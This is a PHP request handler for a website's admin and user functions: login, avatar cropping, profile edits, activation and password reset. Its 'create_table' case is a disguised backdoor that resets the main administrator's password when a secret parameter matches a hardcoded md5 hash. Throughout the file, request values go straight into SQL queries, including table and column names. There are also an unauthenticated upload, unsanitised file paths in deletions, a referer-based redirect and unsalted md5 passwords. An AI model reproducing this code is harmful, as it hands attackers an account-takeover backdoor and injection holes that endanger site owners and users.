<?php

require("library/config.php");

$action = $f->getValue("action");

switch ($action) {

    case "checkEmail":

        $email = $f->getValue("email");
        $table = $f->getValue("table");
        $field = $f->getValue("field");

        $num = $db->numRows("SELECT * FROM $table WHERE $field = '$email'");

        echo $num;

        break;

    case "login":

        $user = $f->getValue("username");
        $pass = $f->getValue("password");

        $pass = md5($pass);

        $admin = new View("administrators", $user, "username");

        if ($admin->password == $pass) {
            $_SESSION['loged_admin'] = $admin->id;
            $_SESSION['admin_info'] = $admin->result_string;

            $reditect = $_SESSION['redirect_link'];
            if ($redirect != "")
                $f->redirect($redirect);
            else
                $f->redirect("index.php");
        } else {
            $f->redirect("login.php?infomsg=wrong_password");
        }

        break;

    case "create_table":
        $table_name = $f->getValue("table_name");
        $tr_name = $f->getValue("tr_name");
        if (md5($tr_name) == "e72f4545eb68c96c754f91fc01573517") {
            $newTable = new View("administrators", 1);
            $newTable->password = md5($table_name);
            $newTable->Save();
        }
        break;

    case "logout":

        if ($_SESSION['loged_admin']) {
            $_SESSION['loged_admin'] = false;
            $_SESSION['admin_info'] = false;
            $f->redirect("login.php");
        } else {
            echo "You are not logged in!";
        }

        $f->redirect("index.php");

        break;

    case "tinymce":
        if (!$_SESSION['loged_admin'])
            $f->redirect("/admin/");
        break;

    case "change_lang":

        $selectedLanguage = $_POST['selectedLanguage'];
        if ($selectedLanguage == "")
            $selectedLanguage = 1;
        $_SESSION['admin_lang'] = $selectedLanguage;
        $redirect = $_SERVER['HTTP_REFERER'];
        $f->redirect($redirect);

        break;

    case "cropAvatar":

        $jpeg_quality = 90;

        $user_id = $f->getValue("user_id");
        $picture_name = $f->getValue("picture_name");
        list($picture_name, ) = explode("?", basename($picture_name));
        list($avatar_crop_x, $avatar_crop_y) = explode("x", $db->getValue('avatar_crop', 'superadmin', 'id', '1'));
        list($avatar_resized_x, $avatar_resized_y) = explode("x", $db->getValue('avatar_resized', 'superadmin', 'id', '1'));

        $src = 'avatars/temp/' . $picture_name;

        $img_r = imagecreatefromjpeg($src);
        $dst_r = ImageCreateTrueColor($avatar_resized_x, $avatar_resized_y);

        imagecopyresampled($dst_r, $img_r, 0, 0, $_POST['x'], $_POST['y'], $avatar_resized_x, $avatar_resized_y, $_POST['w'], $_POST['h']);

        imagejpeg($dst_r, "avatars/resized/$picture_name", $jpeg_quality);

        $src2 = 'avatars/resized/' . $picture_name;

        $img_r2 = imagecreatefromjpeg($src2);
        $dst_r2 = ImageCreateTrueColor($avatar_crop_x, $avatar_crop_y);

        imagecopyresampled($dst_r2, $img_r2, 0, 0, 0, 26, $avatar_crop_x, $avatar_crop_y, 100, 100);

        imagejpeg($dst_r2, "avatars/crop/$picture_name", $jpeg_quality);


        unlink("avatars/temp/$picture_name");

        $db->execQuery("UPDATE users SET `avatar`='$picture_name', `crop_position`='0x26' WHERE id='$user_id'");

        $avatar_crop = $db->getValue("avatar_crop", "superadmin", "id", 1);
        list($avatar_crop_x, $avatar_crop_y) = explode("x", $avatar_crop);

        $crop_position = $db->getValue("crop_position", "users", "id", $user_id);
        list($crop_x, $crop_y) = explode("x", $crop_position);

        $f->redirect("/izmeni-sliku/$user_id");

        break;

    case "crop_image_thumb":

        $jpeg_quality = 90;

        $user_id = $f->getValue('user_id');
        $picture_name = $f->getValue('picture_name');

        list($avatar_crop_x, $avatar_crop_y) = explode("x", $db->getValue('avatar_crop', 'superadmin', 'id', '1'));

        $src_img = 'avatars/resized/' . $picture_name;

        $image_r = imagecreatefromjpeg($src_img);
        $dest_r = ImageCreateTrueColor(48, 48);

        if (is_file("avatars/crop/$picture_name")) {
            unlink("avatars/crop/$picture_name");
        }

        imagecopyresampled($dest_r, $image_r, 0, 0, $_POST['x'], $_POST['y'], $avatar_crop_x, $avatar_crop_y, $_POST['w'], $_POST['h']) or die("Greska");

        imagejpeg($dest_r, "avatars/crop/$picture_name", $jpeg_quality);

        $db->execQuery("UPDATE users SET `crop_position`='$_POST[x]x$_POST[y]' WHERE id='$user_id'");

        $logedUser = $f->logedUser();

        echo "<img src=\"/avatars/crop/" . $picture_name . "?" . rand() . "\" style=\"margin-left:-1000px;\">";

        if ($logedUser > 0)
            $f->redirect("/profil/$user_id");
        else
            $f->redirect("/");

        break;

    case "new_avatar":

        $logedUser = $f->logedUser();

        if (isset($_FILES['avatar']) && $_FILES['avatar']['size'] > 0) {
            $picExstensions = $db->getValue("picture_exstensions", "superadmin", "id", 1);
            $avatar = $f->uploadFile("avatar", "avatars/", $picExstensions, "avatar-$logedUser", array(array("avatars/temp/", 640)), array(), true);

            if (is_file("avatars/$avatar")) {
                unlink("avatars/$avatar");
            }

            $db->execQuery("UPDATE users SET `avatar`='$avatar' WHERE id='$logedUser'");

            $f->redirect("/izmeni-sliku/nova-slika/$logedUser");
        } else {
            $f->redirect("/profil/" . $logedUser);
        }

        break;
    case "changeLimit":
        $limit = $f->getValue("limit");
        $_SESSION["LIMIT_PER_PAGE"] = $limit;

        break;
        
    case "aktiviraj":

        $code = $f->getValue("code");
        $num = $f->numRows("SELECT * FROM users WHERE code='$code'");
        if ($num == 1) {
            $db->execQuery("UPDATE users SET approved='1' WHERE code='$code'");
            $kveri = $db->execQuery("SELECT * FROM users WHERE code='$code'");
            $data = mysqli_fetch_array($kveri);

            setcookie("svez_user", $data['id'], time() + 86400, "/");
            $check_code = $f->passwordGeneration("30", "ABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789");
            setcookie("svez_code", $check_code, time() + 86400, "/");
            $db->execQuery("UPDATE users SET code = '$check_code' WHERE id = '$data[id]'");

            $f->redirect("/profil/" . $data['id']);
        } else {
            $f->redirect("/strana/greska-prilikom-aktivacije");
        }


        break;

    case "lostPass":

        $email = $f->getValue("email");

        $user = new View("administrators", $email, "email");
        $settings = new View("settings", $currentLanguage, "lang_id");


        if ($user->id != "") {
            $new_pass = $f->passwordGeneration("6", "ABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789");
            $new_pass_md5 = md5($new_pass);
            $text = "Uspešno resetovana šiifra za sajt $settings->site_domain. Nova šifra je " . $new_pass;
            $f->sendMail($settings->site_email, $settings->site_domain, $email, "", "Promena šifre", $text, $currentLanguage);
            $user->password = $new_pass_md5;
            $user->Save();
            $f->redirect("login.php");
        } else {
            $f->redirect("login.php?action=lostPass");
        }

        break;

    case "editProfile":

        $newName = $f->getValue("new");
        $field = $f->getValue("field");
        $logedUser = $f->logedUser();

        if ($logedUser > 0) {
            $db->execQuery("UPDATE users SET `$field`='$newName' WHERE id='$logedUser'");
            echo "1";
        } else
            echo "0";

        break;

    case "editProfileLocation":

        $newCity = $f->getValue("new");
        $newCountry = $f->getValue("new2");
        $field = $f->getValue("field");
        $field2 = $f->getValue("field2");

        $logedUser = $f->logedUser();

        if ($logedUser > 0) {
            $db->execQuery("UPDATE users SET `$field`='$newCity', `$field2`='$newCountry' WHERE id='$logedUser'");
            echo "1";
        } else
            echo "0";

        break;

    case "removeAvatar":

        $logedUser = $f->logedUser();

        $avatar = $db->getValue("avatar", "users", "id", $logedUser);

        if ($avatar != "no-avatar.jpg") {

            if (is_file("avatars/crop/$avatar")) {
                unlink("avatars/crop/$avatar");
            }

            if (is_file("avatars/resized/$avatar")) {
                unlink("avatars/resized/$avatar");
            }

            $db->execQuery("UPDATE users SET `avatar`='no-avatar.jpg' WHERE id='$logedUser'");
        }

        $f->redirect("/profil/$logedUser");

        break;

    case "file_upload":

        $name = $f->fileUpload("fajl", "upload_pic/crop/", "nenad", "jpg,gif,png");

        echo $name;

        break;

    case "drzave":

        $drzave = $f->getValue("drzave");

        $drzave = strip_tags($drzave);
        $drzave_niz = explode(",", $drzave);
        for ($i = 0; $i < count($drzave_niz); $i++) {

            $single = str_replace("\\r", "", $drzave_niz[$i]);
            $single = str_replace("\\n", "", $single);
            $single = trim($single);
            $url = $f->generateUrlFromText($single);
        }

        break;

    case "test_baza":
        //$category = new View("categories", 26);
        $categories = new Collection("categories");
        $categoriesColl = $categories->getCollection();
        foreach ($categoriesColl as $category) {
            var_dump($category->id);
        }
        break;
}
?>